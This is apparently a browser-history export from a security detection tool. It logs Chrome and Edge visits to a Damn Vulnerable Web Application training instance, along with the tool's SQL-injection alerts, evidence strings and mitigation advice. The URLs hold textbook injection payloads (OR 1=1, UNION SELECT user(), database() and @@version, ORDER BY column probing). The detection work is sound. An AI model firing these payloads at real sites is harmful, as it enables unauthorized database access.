user,browser,artifact_type,url,title,threat_severity,threat_type,threat_confidence,all_threat_types,threat_evidence,browser_name,profile_path,referrer_url,threat_critical_count,threat_description,threat_high_count,threat_low_count,threat_medium_count,threat_mitigation,visit_count,visit_time,visit_type
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=Submit#,,,,,,,chrome,,Direct Navigation,,,,,,,1,2025-07-04 00:13:16,
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,Direct Navigation,,,,,,,2,2025-07-04 00:13:08,
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,Direct Navigation,,,,,,,1,2025-07-04 00:13:02,
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,Direct Navigation,,,,,,,2,2025-07-04 00:12:56,
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,http://3.141.30.168/vulnerabilities/sqli/,,,,,,,1,2025-07-04 00:12:50,
brows,chrome,history,http://3.141.30.168/vulnerabilities/sqli/,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF","SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1'#; Matched pattern in decoded form: 1' OR '1'='1'#; Found in browser history at 2025-07-04 00:14:17; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Found in browser history at 2025-07-04 00:14:17; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment; Parameter 'id' contains potential SQL injection: 1' UNION SELECT @@version,@@version_comment#; Matched pattern in decoded form: 1' UNION SELECT @@version,@@version_comment#; Found in browser history at 2025-07-04 00:14:00; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment; Found in browser history at 2025-07-04 00:14:00; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),database()#; Matched pattern in decoded form: 1' UNION SELECT user(),database()#; Found in browser history at 2025-07-04 00:13:46; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit; Found in browser history at 2025-07-04 00:13:46; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Ctable%28%29%2Cdatabase%2; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),table(),database()#; Matched pattern in decoded form: 1' UNION SELECT user(),table(),database()#; Found in browser history at 2025-07-04 00:13:35; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Ctable%28%29%2Cdatabase%2; Found in browser history at 2025-07-04 00:13:35; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1' ORDER BY 2#; Matched pattern in decoded form: 1' OR '1'='1' ORDER BY 2#; Found in browser history at 2025-07-04 00:13:17; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Found in browser history at 2025-07-04 00:13:17; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),database()--; Matched pattern in decoded form: 1' UNION SELECT user(),database()--; Found in browser history at 2025-07-04 00:13:16; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=; Found in browser history at 2025-07-04 00:13:16; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR 1=1#; Matched pattern in decoded form: 1' OR 1=1#; Found in browser history at 2025-07-04 00:13:02; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Found in browser history at 2025-07-04 00:13:02; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#; Parameter 'id' contains potential SQL injection: ' OR '1'='1; Matched pattern in decoded form: ' OR '1'='1; Found in browser history at 2025-07-04 00:12:50; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#; Found in browser history at 2025-07-04 00:12:50",chrome,,http://3.141.30.168/index.php,0,Potential SQL Injection attack detected in URL parameter,8,0,8,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-07-04 00:12:40,
brows,chrome,history,http://3.141.30.168/index.php,Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,http://3.141.30.168/login.php,,,,,,,1,2025-07-04 00:12:35,
brows,chrome,history,http://3.141.30.168/login.php,Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,http://3.141.30.168/,,,,,,,1,2025-07-04 00:12:30,
brows,chrome,history,http://3.141.30.168/,Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,chrome,,Direct Navigation,,,,,,,1,2025-07-04 00:12:30,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli_blind/,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,Direct Navigation,,,,,,,1,2025-07-04 00:08:34,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1'#; Matched pattern in decoded form: 1' OR '1'='1'#; Found in browser history at 2025-07-04 00:08:28; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Found in browser history at 2025-07-04 00:08:28,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-07-04 00:08:28,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,Direct Navigation,,,,,,,1,2025-07-04 00:08:18,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,Direct Navigation,,,,,,,3,2025-07-04 00:08:00,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,Direct Navigation,,,,,,,3,2025-07-04 00:07:44,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Ctable%28%29%2Cdatabase%28%29%23&Submit=Submit#,,,,,,,edge,,Direct Navigation,,,,,,,1,2025-07-04 00:07:41,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,Direct Navigation,,,,,,,3,2025-07-04 00:07:32,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1' ORDER BY 2#; Matched pattern in decoded form: 1' OR '1'='1' ORDER BY 2#; Found in browser history at 2025-07-04 00:07:16; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Found in browser history at 2025-07-04 00:07:16,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-07-04 00:07:16,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=Submit#,,,,,,,edge,,Direct Navigation,,,,,,,1,2025-07-04 00:07:13,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1' ORDER BY 2#; Matched pattern in decoded form: 1' OR '1'='1' ORDER BY 2#; Found in browser history at 2025-07-04 00:07:16; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+2%23&Submit=Submit#; Found in browser history at 2025-07-04 00:07:16,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-07-04 00:07:03,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR 1=1#; Matched pattern in decoded form: 1' OR 1=1#; Found in browser history at 2025-07-04 00:06:55; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Found in browser history at 2025-07-04 00:06:55,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,3,2025-07-04 00:06:55,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+32&Submit=Submit#,,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+32&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1' ORDER BY 32; Matched pattern in decoded form: 1' OR '1'='1' ORDER BY 32; Found in browser history at 2025-07-04 00:06:51; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+32&Submit=Submit#; Found in browser history at 2025-07-04 00:06:51,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-07-04 00:06:51,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR 1=1#; Matched pattern in decoded form: 1' OR 1=1#; Found in browser history at 2025-07-04 00:06:55; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Found in browser history at 2025-07-04 00:06:55,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,3,2025-07-04 00:06:45,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+3%23&Submit=Submit#,,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+3%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1' ORDER BY 3#; Matched pattern in decoded form: 1' OR '1'='1' ORDER BY 3#; Found in browser history at 2025-07-04 00:06:42; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+3%23&Submit=Submit#; Found in browser history at 2025-07-04 00:06:42,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-07-04 00:06:42,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR 1=1#; Matched pattern in decoded form: 1' OR 1=1#; Found in browser history at 2025-07-04 00:06:55; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#; Found in browser history at 2025-07-04 00:06:55,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,3,2025-07-04 00:06:33,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Parameter 'id' contains potential SQL injection: 1' OR '1'='1'#; Matched pattern in decoded form: 1' OR '1'='1'#; Found in browser history at 2025-07-04 00:08:28; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#; Found in browser history at 2025-07-04 00:08:28,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-07-04 00:06:24,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF",SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#; Parameter 'id' contains potential SQL injection: ' OR '1'='1; Matched pattern in decoded form: ' OR '1'='1; Found in browser history at 2025-07-04 00:06:16; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#; Found in browser history at 2025-07-04 00:06:16,edge,,http://3.141.30.168/vulnerabilities/sqli/,0,Potential SQL Injection attack detected in URL parameter,1,0,1,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-07-04 00:06:16,
brows,edge,history,http://3.141.30.168/vulnerabilities/sqli/,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,"SQLi, CSRF","SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment; Parameter 'id' contains potential SQL injection: 1' UNION SELECT @@version,@@version_comment#; Matched pattern in decoded form: 1' UNION SELECT @@version,@@version_comment#; Found in browser history at 2025-07-04 00:08:18; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment; Found in browser history at 2025-07-04 00:08:18; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),database()#; Matched pattern in decoded form: 1' UNION SELECT user(),database()#; Found in browser history at 2025-07-04 00:08:00; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit; Found in browser history at 2025-07-04 00:08:00; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Ctable%28%29%2Cdatabase%2; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),table(),database()#; Matched pattern in decoded form: 1' UNION SELECT user(),table(),database()#; Found in browser history at 2025-07-04 00:07:41; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Ctable%28%29%2Cdatabase%2; Found in browser history at 2025-07-04 00:07:41; SQL injection pattern found in URL: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=; Parameter 'id' contains potential SQL injection: 1' UNION SELECT user(),database()--; Matched pattern in decoded form: 1' UNION SELECT user(),database()--; Found in browser history at 2025-07-04 00:07:13; URL contains potential CSRF pattern: http://3.141.30.168/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=; Found in browser history at 2025-07-04 00:07:13",edge,,http://3.141.30.168/index.php,0,Potential SQL Injection attack detected in URL parameter,4,0,4,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-07-04 00:06:07,
brows,edge,history,http://3.141.30.168/index.php,Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,http://3.141.30.168/login.php,,,,,,,1,2025-07-04 00:05:31,
brows,edge,history,http://3.141.30.168/login.php,Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,,edge,,http://3.141.30.168/,,,,,,,1,2025-07-04 00:05:25,
